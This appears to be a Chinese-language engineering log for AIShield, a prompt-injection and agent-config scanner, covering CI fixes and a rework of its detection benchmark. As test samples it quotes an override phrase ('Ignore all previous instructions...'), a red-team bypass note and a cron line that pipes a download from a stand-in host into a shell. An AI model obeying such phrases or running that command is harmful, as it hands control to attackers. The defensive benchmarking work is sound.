# 2026-09-20 工作日志

## 闭环融合与修复（用户指令：尽量减少无效和空转的任务，闭环任务需要修复的直接修复掉）

### 盘点
- 20 个 GitHub Actions workflow + 5 条 AIShield 本地自动化，全部解析触发方式/定时/作业/权限。
- 结论：**无真正空转的闭环**，5 条自动化职责互不重叠（雷达/自检/竞品/分发/周报），无需融合。

### 🟥 已修复的真红灯：geo-indexnow 9/9 全红
- **根因**：`geo-indexnow-submit.yml` workflow 级 `permissions: contents: read`，
  心跳步骤 `git_push_safe.sh` 每次 push 403 → 重试 5 次 → `exit 1` → 整条 job 失败。
  核心 key-check + submit 在全部 9 次运行中**都成功了**——只是末步装饰性心跳拖成红灯。
- **修法（双层）**：① `permissions: contents: read → contents: write`；
  ② 心跳 push 加 `|| true`（best-effort 状态回写，不该盖过核心红绿灯）。
- 横向核查 20 个 workflow 的 push/权限匹配：只有 geo-indexnow 一个真问题
  （`ci.yml` 的 push 在 job 级已提权；`publish-npm` 的 git push 只在注释里）。
- `validate_workflows.py` 20/20 通过。推送 `49132475`。

### 🟡 已更新的过期基线（2 条自动化 prompt）
- 每日安全守夜：测试基准 670 → **1199 通过 / 26 跳过**。
- 分发缺口巡检：版本基线 4.2.2/227 规则/6 工具 → **4.3.0/235 规则/7 工具**（含 aishield_digest）。
- 过期基线会导致「测试失败数 > 0」或「版本漂移」误判。

### 关键确认（记录在案，非故障）
- `self_scan.py` **不在任何 CI workflow 里**（unified-security-scan 扫的是仓库自身态势，
  不是台账外发布物）→ 本地守夜是台账外自检的唯一执行者。by design（需读本地全树 + allowlist）。
- `tech_radar.py` 不被任何 workflow 调用 → by design（需 WebSearch/agent 推理，CI 跑不了）。
- spine 第 1 步注释叫「雷达数据采集」但实际接 `data-scan-flywheel`（批量扫描），
  与真正雷达 `tech_radar.py` 不是一回事。已记录不改注释（改需动 spine，风险 > 收益）。

### 新增文档
- `docs/intel/2026-09-20-closed-loop-topology.md`：闭环拓扑诊断，含全量 workflow/自动化清单、
  空转判据、已修红灯、过期基线、不需修的记录在案项。

### 遗留（需用户本人）
- 吊销曾硬编码进 public 仓库历史的旧 CF token。
- aishield.tools CF Pages Retry（3 个 cfut_ token 权限不足，无法 API 触发）。

## server-card 第 7 工具修复 + 部署时序竞态（10:30）
- `api/static/.well-known/mcp/server-card.json` 只有 6 个工具，缺 `aishield_digest`；
  且描述里 skill 规则数写 241（实际 244）。本地/远端 git/线上**三方一致地错**——不是部署问题，
  是代码遗漏。修后推 `f9890861`，18/18 MCP 契约测试通过。
- 🟥 **部署时序竞态**：dispatch（01:07:36Z）比 `f9890861` 提交（01:08:01Z）**早 25 秒**，
  dispatch 时 main HEAD 还是 `57f048b0`（部署成功但部署的是旧 sha）→ 线上 server-card 仍 6 工具。
  **push 与 workflow_dispatch 不是原子操作**：推送完成前触发的 dispatch 会部署到推送前一刻的 HEAD。
  → 修法：push 完成后**先查 main HEAD 再 dispatch**，dispatch 后核对 run 的 `head_sha` 是否含目标 commit。
  已重新 dispatch（204，main @ `8192c9f1`）。

## 外部市场分析评估（10:44，用户转发四视角市场分析，要求评估哪些可作提升）
第一手核实结果（逐条对照，不照单全收）：
- ✅ 对：GitHub stars=2 / forks=0 / open_issues=7；ROADMAP 3 个月目标 stars 500 实际 2（上次评审 09-07）；
  `capability_gap.py` 存在（405 行，adopt 线分析）。
- ✅ **对且比它说的更糟**：规则数声明位混乱。`mcp-server/README.md` 里同时存在
  **113/201/208/235/241/62 六个数字**；`mcp-server/server.json` 写 skill 241（应 244）。
  它说「三个数字」低估了——实际 6 个。
- ❌ **错**：「没有任何基准数据支撑」——`docs/benchmark/v1.md` 存在（96.0% 召回 / 0.0% 误报 + 15 轴分解表），
  `scripts/benchmark.py` 存在。它主张「用可核验证据替代纸面 claim」，自己却没核验就下结论。
- ❌ **错**：「文档全是概念、缺 interactive demo」——`api/static/` 有 13 个 HTML 页面，
  含 `scan.html`(17.5KB) 在线扫描页、`attack-graph.html`、`scan_report.html`。
- ❌ 过期：skill 规则数 241（实际 244，server-card 已修对）。
- ⚠️ 部分对：`benchmarks/` 确实只有 6 个文件（malicious/index.js 仅 526B），demo 素材薄——
  但缺的是「预置恶意样本一键试」，不是从零做 demo。
- ❓ 无法独立验证：AgentAuditKit 271 规则 / 1100+ 测试 / 已上 Marketplace（外部竞品，无访问手段）；
  COMMUNITY.md 台账 `downloads: 1`（本地没匹配到该行）。
- 🟥 **它没提到的真问题**：`docs/` 目录在线上**完全不可达**——
  `/docs/benchmark/v1.md`、`/benchmark`、`/api/v1/benchmark`、`/docs/aishield-verification-harness.md` 全 404。
  即 benchmark 数据有、harness 文档有，**但对外通道没有**。这比它说的「没发布 benchmark」更精确。
- 结论：方向判断（先做可核验外部证据）大体对，但三条 P0/P1 的**前提事实错误**；
  「双市场稀释定位」「零依赖恰是边界市场」两条不建议采纳（后者与它自己在用户视角的论证自相矛盾）。

## 14:45 三任务收口（规则数门禁 / 基准语料 / docs 通道）
- **规则数门禁收官**：修掉最后一个假绿——`test_cell_marker_only_exempts_neighbouring_number`
  用带 `|` 的表格行测 `_is_breakdown_context`，但那类行已由 `_is_breakdown_row` 整行豁免，
  根本走不到单点豁免；`CELL_WINDOW=14` 下 `MCP-06`(idx2) 在 `22`(idx22) 的 14 字符窗口外，
  故断言假失败。改成列表式分解项 `MCP-06 覆盖 22 条规则` 后语义与实现一致。**31/31 绿**。
- **基准真实基线（纠正原计划）**：原计划「扩到 20 条」基于错误假设。实际是
  `rule_corpus.py` ATTACK_SAMPLES=28 / BENIGN_CORPUS=20，配置面 22 恶意 / 6 良性（参数化）。
  真值 **48/50 = 96.0% 召回，0/31 误报**，2 处漏检：
  1. 指令面 #2 `credential theft: the server leaks AWS keys...` —— **标注错了**，是叙述体
     不是祈使式，零命中。改成祈使式 + 字面凭证（`AKIA`+拼接，避 secret scanning）后由
     `MCP01-004` 命中。recall → **98.0%**。
  2. 配置面 `cfg-mal-uvx_auto_install-generic_password` —— 只报 medium，**站得住**
     （`uvx` 无 `-y` 比 `npx -y` 低一档），非缺陷。
- **⚠️ 新发现（未动，待拍板）：两平面检出线不一致**。指令面 `_plane_a` 是「任一 finding 即命中」
  （含 low/info），配置面 `_plane_b` 是「仅 critical/high」。**总分 96%/98% 是混合口径求和**。
  实测指令面 28 条命中样本**全部** low/info —— serious-only 口径下指令面召回 **0/28**。
  旗舰样本 `Ignore all previous instructions...` 只有 `MCP06-001 low`，总 `risk=None`。
  → 检测层严重度标定问题。已只加披露（`detection_bar` 字段 + v1.md 混合口径告示），
  未改口径数字（改则改对外声明，属用户拍板项）。
- **口径矛盾已修**：`_plane_b` docstring 写 below-threshold「不算漏报」，但 `recall` 算术
  把它当未检出——同一样本既在「不计入漏报」表里又在「检出缺口」清单里。已统一措辞。
- **误诊更正**：守夜报告把 `tests/test_benchmark.py:190` 的 `--fail-under-recall 1.5`
  读成「脚本内部打印瑕疵（阈值恒>1）」。实际是**故意**测门禁在不可能阈值下会红
  （`assertEqual(rc, 1)`）。不是 bug。
- **语料扩充（fp=0% 从 31→45 负样本）**：BENIGN_CORPUS 20→30（+10 真实世界引用语境：
  malware 工具描述/runbook/CVE 变更日志/红队笔记/沙箱说明等）；配置良性 6→10（+本地 node
  脚本/python 模块/本地二进制 socket/api-key 占位）。
- **扩充踩到的真实边界**：`Red team notes: our favorite bypass starts with ignore all
  previous instructions...` 在 `s.md` 下是 `low`，在 `skills/skill_26.md` 下是 **critical**
  —— 路径敏感是**正确行为**（skill 文件里出现该短语本就是真威胁），引用抑制只在有
  明确引用标记（fixture / example payload）时触发。已按正确方向改样本措辞，未动扫描器。
- **陈旧对外声明已修**：`docs/benchmark-report.md:49` 仍称 96%（且与自身「10+10 样本」
  方法论自相矛盾）。已标注为 2026-08-27 一次性不可复现结果并指向 `docs/benchmark/v1.md`。
  `docs/intel/2026-09-19-borrowing-map.md` 的 96% 是带日期的历史记录，未改（改写历史更糟）。
- **最终态**：`run_all.py` **1230 Passed / 0 Failed / 26 Skipped**；`rule_count_gate --check`
  47 声明位无漂移；benchmark 49/50=98.0%、0/45=0.0%；`docs/benchmark/v1.md` 已重生成；
  docs 渲染器验证通过（102 篇可列，v1.md 标题 `AIShield Security Benchmark v1`）。
- **未推送**：本机无 `.git`，全部改动仍在本地，待走 `gh_push.py` + `workflow_dispatch`。


## 22:05 第二轮：基准口径统一 + is_doc 注入豁免 + 中文引用标记
- **口径统一（上轮遗留的拍板项已落地）**：两平面统一主口径 `serious_only`，
  `any_finding` 降级为只算「规则覆盖」、不配误报率。理由：良性配置/文档上的 low/info
  命中是信息性标注（「该配置使用运行时拉包」），给它算 fp 会得到 40%+ 既不可操作也无法
  治理的废数。两平面同口径总分才可相加；此前 any+serious 混算是假绿。
  新数：**serious_only 45/50 = 90.0% 召回、0/45 = 0.0% 误报；覆盖 50/50 = 100.0%**。
  指令面 24/28（85.7%）、配置面 21/22（95.5%），检出缺口 5 条公开列在 v1.md。
  门禁 MIN_RECALL 0.95→0.85、新增 MIN_COVERAGE=1.00。
- **is_doc 一刀切降级已改**：`analyze()` 原对 .md/.txt 把 critical/high 整档降 low。
  但注入的天然栖息地就是文本（工具描述/检索网页/markdown/SKILL.md），生产路径
  `server.check_prompt_injection` 对提示词文本**完全不施加**文档降级 —— 两条路径给
  同一个载荷两种严重度（生产 critical、analyze low）。这是指令面 serious 0/28 的真根因。
- **豁免按规则语义，不是 OWASP 类别**（踩了两次）：第一版按类别整组豁免（MCP06+ASI*），
  `run_all` 出 4 fail + 1 error —— MCP06 里混着「持久化/自启动指令」cron 类，文档给 cron
  示例是正常实践，整类豁免把 `guardrail-harness/README.md` 的 deny 演示样本
  （`"* * * * * curl evil | sh"`）报成阻断项。第二版按**规则描述语义**判豁免
  （MCP06 仅注入/越狱/角色扮演/系统提示窃取 + ASI* 整组），cron 类继续被压住。
  `distribution/` 的 README npx/localhost 用法样例继续留在降级侧。
- **引用抑制补了中文标记**：`_CITATION_MARKERS` 词表此前只有英文，中文防御文档整块盲区。
  加 例如/示例/检测/拦截/拦下/阻止/威胁模型/测试用例/测试样本/已知攻击/已知漏洞。
  **刻意不加** 防御/如下 —— 前者过宽、后者是祈使式，会把真攻击一起压掉。
  实测对语料零影响（24/28 不变、良性 FP 仍 0），但修掉了 proxy_example.py 一条 critical。
- **窗口没放宽**：guardrail-harness 那条 cron 命中的「例如」在 -190、「示例」在 +221，
  远超 back=100/fwd=60。放宽窗口是错的方向（窄窗口正是防逃逸的设计），
  所以用「语义豁免收窄」而不是「窗口放宽」解决。
- **基准喂样路径修正**：指令面从 `sample.md` 改 `skills/payload_NN.md`。三条依据：
  样本是 agent 指令攻击不是人类文档；生产路径不施加文档降级；良性侧早已用
  `skills/skill_NN.md` 喂样。`sample.md` 让每条攻击样本都触发 is_doc 降级 —— 那个 0/28
  不是扫描器看不见注入，是基准把攻击标注成了文档（与 ATTACK_SAMPLES[2] 同一类标注错误）。
- **新增回归测试**：`tests/test_benchmark.py` 加 3 个类（双口径门禁 + 指令面喂样路径必须
  是 agent-instruction 路径 + 行为级断言 serious 召回不得回到 0）；
  `tests/test_rule_audit_contract.py` 加 `TestDocSeverityExemption` 5 个测试
  （README.md 里注入必须 critical/high、cron 示例必须继续压住、非注入文档示例继续压住、
  analyze 与生产路径 check_prompt_injection 严重度一致、中文引用标记生效）。
- **陈旧对外声明再修**：`docs/benchmark-report.md` 的更正注记从「49/50 = 98.0%」改成
  现行双口径数字，并补注那张对比表的「100% / 460」同样不可复现、规则数已过期
  （现 MCP 235 / Skill 241）。
- **最终态**：`run_all.py` **1244 total / 1243 Passed / 0 Failed / 1 Error / 26 Skipped**。
  唯一 Error 是 `test_loader_prefers_env_over_file` 的 `subprocess.run(['bash','-n',...])`
  → `FileNotFoundError`：本会话 `shutil.which('bash')` 为 None（shell shim 已坏，
  `dirname`/`cd`/`head`/`tail` 全 not found）。**环境问题，非回归**。
  日志里那行 `FAIL: recall 0.9000 < 1.5000` 是「故意测不可能阈值门禁会红」的测试
  自己打印的（该测试断言 rc==1，是通过的）。
  `rule_count_gate --check` 47 声明位无漂移。`docs/benchmark/v1.md` 已重生成。
- **未纳入推送**：`api/data/*.json`、`data/state/tech_radar.json`、`api/data/usage.json`
  是测试跑/服务启动的运行时状态翻写（22:02 与 14:40），避免把测试产物推上 main。
